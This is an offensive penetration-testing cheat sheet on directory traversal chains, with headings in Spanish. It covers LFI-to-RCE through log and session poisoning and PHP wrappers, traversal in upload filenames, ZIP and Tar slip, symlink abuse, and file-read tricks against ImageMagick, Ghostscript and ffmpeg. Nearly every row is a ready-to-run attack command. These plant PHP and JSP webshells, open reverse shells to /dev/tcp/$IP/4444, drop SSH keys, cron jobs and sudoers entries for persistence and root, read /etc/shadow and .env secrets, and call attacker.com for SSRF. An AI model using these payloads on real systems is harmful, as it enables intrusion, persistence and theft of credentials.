---
aliases:
  - LFI to RCE
  - ZIP Slip
  - Tar Slip
  - Symlink Abuse
tags:
  - type/technique
  - vuln/path-traversal
  - technique/execution
  - technique/lateral-movement
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Directory Traversal]]"
  - "[[File Inclusion]]"
  - "[[Insecure Deserialization]]"
---
# Directory Traversal - Chains y Variantes

***

## LFI to RCE Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -A '<?php system($_GET["c"]); ?>' https://target/ && curl 'https://target/page?file=../../../var/log/apache2/access.log&c=id'` | Apache log poisoning + LFI execute | Standard log poison. |
| `curl -A '<?php system($_GET["c"]); ?>' https://target/ && curl 'https://target/page?file=../../../var/log/nginx/access.log&c=id'` | nginx log poisoning | Same idea nginx. |
| `curl -A '<?php exec("bash -c \"bash -i >& /dev/tcp/$IP/4444 0>&1\""); ?>' https://target/ && curl 'https://target/?file=../../../var/log/apache2/access.log'` | Log poison reverse shell | RCE pivot. |
| `curl -H 'User-Agent: <?php system($_GET["c"]); ?>' 'https://target/cgi-bin/x' && curl 'https://target/?file=../../../proc/self/environ&c=id'` | /proc/self/environ poison | Linux /proc. |
| `curl -X POST -d 'EMAIL=<?php system($_GET["c"]); ?>' https://target/login && curl 'https://target/?file=../../../var/log/mail.log&c=id'` (SMTP RCPT poison) | Mail log poisoning | Less common. |
| `curl -b 'PHPSESSID=test1' -d 'name=<?php system($_GET["c"]); ?>' https://target/profile && curl -b 'PHPSESSID=test1' 'https://target/?file=../../../var/lib/php/sessions/sess_test1&c=id'` | Session file poison + LFI | Session-aware. |
| `curl 'https://target/?file=php://filter/convert.iconv.UTF8.CSISO2022KR\|convert.base64-decode\|convert.iconv.UTF8.CSISO2022KR/resource=data://,<?php system(\"id\"); ?>'` | PHP filter chain RCE technique | Filter chain RCE. |
| `curl -X POST --upload-file polyglot.phar https://target/upload && curl 'https://target/?file=phar:///tmp/uploaded.phar/x'` | Phar deserialization trigger | Phar deser combo. |
| `echo '<?php system($_GET["c"]); ?>' > shell.txt && curl --upload-file shell.txt https://target/upload && curl 'https://target/?file=../../tmp/shell.txt&c=id'` | Upload `.txt` + LFI extension bypass | Upload + LFI. |
| `exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg && curl -F 'file=@image.jpg' https://target/upload && curl 'https://target/?file=../../uploads/image.jpg&c=id'` | EXIF metadata + LFI polyglot | Polyglot. |
| `curl 'https://target/?file=data://text/plain;base64,'$(echo '<?php system("id"); ?>' \| base64 -w0)` | data:// inline PHP RCE | data wrapper. |
| `curl 'https://target/?file=expect://id'` | expect:// command direct RCE | PHP expect ext. |
| `curl 'https://target/?file=../../WEB-INF/web.xml'` | Java WEB-INF/web.xml leak | Tomcat config disclosure. |
| `curl 'https://target/?file=../../application.properties' \| grep -i password` | Spring properties secrets | Spring leak. |
| `curl 'https://target/?file=../../../var/www/.env' \| grep -E 'DB_\|SECRET'` | .env DB/secret leak | Modern app .env. |
| `curl 'https://target/?file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php' \| base64 -d \| grep -E "DB_\|SECRET"` | wp-config.php base64 read | WordPress credentials. |
^pt-chain-lfi-rce

### Workflow log poisoning + LFI

```bash
# 1. Inject PHP via User-Agent
curl -A '<?php system($_GET["c"]); ?>' https://target/

# 2. Trigger LFI to read log
curl 'https://target/page?file=../../../var/log/apache2/access.log&c=id'
# Output: uid=33(www-data) gid=33(www-data) ...

# 3. Reverse shell
PAYLOAD='bash -c "bash -i >& /dev/tcp/'$IP'/4444 0>&1"'
curl --data-urlencode "c=$PAYLOAD" -G \
  'https://target/page?file=../../../var/log/apache2/access.log'
```

___

## Path Traversal en File Upload

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -F 'file=@shell.php;filename=../../../var/www/html/sh.php' https://target/upload` | Filename traversal write to webroot | Unsanitized filename. |
| `curl -F 'file=@shell.php;filename=shell.php%00.jpg' https://target/upload` | NUL byte truncate extension check | Truncate. |
| `curl -F 'file=@shell.php;filename=shell.php.jpg' https://target/upload` | Double extension trick | Extension check bypass. |
| `curl -F 'file=@shell.php;filename=..%2f..%2fshell.php' https://target/upload` | URL-encoded slash filename | URL encoded. |
| `curl -F 'file=@shell.php;filename=..\..\inetpub\wwwroot\sh.aspx' https://target/upload` | Windows backslash filename | Windows write. |
| `curl -F 'file=@shell.php;filename=../../../var/www/index.php' https://target/upload` | Overwrite legit index.php | Deface/replace. |
| `curl -F 'file=@key.txt;filename=../../../home/admin/.ssh/authorized_keys' https://target/upload` | Drop SSH authorized_keys | SSH access. |
| `curl -F 'file=@cron;filename=../../../etc/cron.d/poison' https://target/upload` | Drop cron job | Persistence. |
| Burp Repeater modify `Content-Disposition: filename="../../sh.php"` | Manual filename inject in multipart | Workflow. |
| `curl -F $'file=@sh.php;filename=test.png\r\nX-Inject: header' https://target/upload` | CRLF in filename header inject | CRLF combo. |
| `curl -F 'file=@symlink_to_passwd;filename=normal.txt' https://target/upload` | Symlink upload | Symlink combo. |
^pt-chain-upload

___

## ZIP Slip / Tar Slip / Archive Traversal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.writestr('../../../var/www/html/sh.php','<?php system(\$_GET[\"c\"]); ?>'); z.close()" && curl -F 'file=@evil.zip' https://target/upload` | ZIP slip → webshell drop webroot | Standard ZIP slip. |
| `tar --transform='s,^,../../../var/www/html/,' -czf evil.tar.gz sh.php && curl -F 'file=@evil.tar.gz' https://target/upload` | Tar slip with rename transform | Tar slip. |
| `python3 -c "import tarfile,io; t=tarfile.open('evil.tar','w'); i=tarfile.TarInfo('../../etc/cron.d/poison'); d=b'* * * * * root bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"\n'; i.size=len(d); t.addfile(i,io.BytesIO(d)); t.close()" && curl -F 'file=@evil.tar' https://target/upload` | Tar slip cron job drop | Cron persistence. |
| `mkdir -p slip && echo '<?php system($_GET["c"]); ?>' > slip/../../../var/www/html/sh.php && cd slip && zip -r ../evil.zip .` | DIY ZIP slip create | Direct create. |
| `python3 -c "import tarfile,os; t=tarfile.open('evil.tar','w'); os.symlink('/etc/passwd', 'link'); t.add('link'); t.close()"` then upload | Symlink in tar extract follow | Symlink combo. |
| `python3 -c "import zipfile; z=zipfile.ZipFile('evil.war','w'); z.writestr('../../../var/lib/tomcat9/webapps/sh.jsp','<%@ page import=\"java.io.*\"%><% Process p = new ProcessBuilder(\"sh\",\"-c\",request.getParameter(\"c\")).start(); %>'); z.close()"` then upload | WAR slip drop JSP webshell | Java WAR. |
| `git clone https://github.com/snyk/zip-slip-vulnerability && cd zip-slip-vulnerability/archives && cat README.md` | Snyk ZIP slip exploit archives reference | Reference repo. |
| `curl -F 'file=@evil.zip' https://target/upload && curl 'https://target/sh.php?c=id'` | Trigger uploaded webshell post-extract | Standard trigger. |
| `python3 -c "import zipfile; z=zipfile.ZipFile('e.zip','w'); z.writestr('../../../root/.ssh/authorized_keys','ssh-rsa AAAA...attacker@x'); z.close()"` | SSH key drop via ZIP slip | SSH persistence. |
| `python3 -c "import tarfile,io; t=tarfile.open('e.tar','w'); i=tarfile.TarInfo('../../../etc/sudoers.d/poison'); d=b'attacker ALL=(ALL) NOPASSWD: ALL\n'; i.size=len(d); t.addfile(i,io.BytesIO(d)); t.close()"` | Sudoers drop privesc | Sudoers privesc. |
^pt-chain-zipslip

### Crafting malicious ZIP

```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('readme.txt', 'Looks innocent')
    zf.writestr('../../../var/www/html/sh.php',
                '<?php system($_GET["c"]); ?>')
```

___

## Symlink Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ln -s /etc/passwd /writable/poison && curl 'https://target/?file=/writable/poison'` | Direct symlink read sensitive file | Writable dir. |
| `python3 -c "import zipfile,os; os.symlink('/etc/passwd','passwd_link'); z=zipfile.ZipFile('e.zip','w'); z.write('passwd_link'); z.close()"` then upload | Symlink in ZIP extract follows | Archive symlink. |
| `tar -hcf evil.tar /tmp/symlink_to_secret` (con `-h` follow) | Tar `-h` follow symlinks | Tar flag. |
| `ln -s /etc/passwd image.jpg && curl -F 'file=@image.jpg' https://target/upload` | Symlink upload as image | Image processor follow. |
| `convert 'mvg:msl:/etc/passwd' out.png` (ImageMagick) | Symlink-style file read ImageMagick | ImageTragick. |
| `ln -s /proc/self/environ link && curl -F 'file=@link;filename=image.jpg' https://target/upload-process` | Symlink to /proc/environ | Combo /proc. |
| `(while true; do ln -sf /etc/passwd /tmp/poison; ln -sf /tmp/safefile /tmp/poison; done) &` (TOCTOU race) | Symlink TOCTOU race | TOCTOU race. |
| `docker run --rm -v /:/host alpine sh -c "ln -s /host/etc/shadow /escape"` | Container escape via mount symlink | Container break. |
| `tar -tvf backup.tar \| grep -E "^l"` | Detect symlinks in backup tar | Pre-extract audit. |
| `cat /etc/apache2/apache2.conf \| grep -i FollowSymLinks` (audit defender side) | Audit Apache FollowSymLinks config | Misconfig probe. |
| `curl 'https://target/?file=/writable/symlink_to_secret'` post-create-link | Trigger LFI via symlink | LFI combo. |
^pt-chain-symlink

___

## ImageMagick / File Processors

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `echo 'push graphic-context\nviewbox 0 0 640 480\nfill "url(file:///etc/passwd)"\npop graphic-context' > evil.mvg && curl -F 'image=@evil.mvg' https://target/upload` | ImageTragick MVG file read | CVE-2016-3714. |
| `convert evil.mvg out.png` (local repro) | Local ImageTragick test | Repro. |
| `echo '<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="file:///etc/passwd"/></svg>' > evil.svg && curl -F 'file=@evil.svg' https://target/upload` | SVG xlink:href file read | SVG processor. |
| `echo 'push graphic-context\nviewbox 0 0 640 480\nimage Over 0,0 0,0 "https://attacker.com/log"\npop graphic-context' > ssrf.mvg && curl -F 'image=@ssrf.mvg' https://target/upload` | MVG SSRF via image fetch | SSRF combo. |
| `gs -dSAFER=false -dBATCH -dNOPAUSE -sDEVICE=ppmraw -sOutputFile=/tmp/o.ppm -c '(/etc/passwd) (r) file dup 1000 string readstring print quit'` (local repro) | Ghostscript file read | Ghostscript injection. |
| `ffmpeg -i 'concat:/etc/passwd' -y out.mp4` (local repro) | ffmpeg concat protocol file read | ffmpeg HLS combo. |
| HLS playlist `playlist.m3u8` con `file:///etc/passwd` entries → upload to media processor | HLS playlist file read | ffmpeg HLS. |
| `nuclei -t http/cves/2016/CVE-2016-3714.yaml -u https://target` | ImageTragick CVE template | Auto detect. |
| `exiftool -Comment='$(<malicious payload>)' image.jpg && curl -F 'file=@image.jpg' https://target/upload` | EXIF inject pre-processor | EXIF combo. |
| `curl -F 'file=@polyglot.zip;type=image/png' https://target/upload-image` | Polyglot ZIP+PNG | Polyglot. |
| `gs -sDEVICE=pdfwrite -o out.pdf evil.ps` (Ghostscript PS run) | PostScript file ops | PS injection. |
| `libreoffice --headless --convert-to pdf evil.docx` (macro doc) | LibreOffice macro RCE | Macro doc. |
^pt-chain-image

***
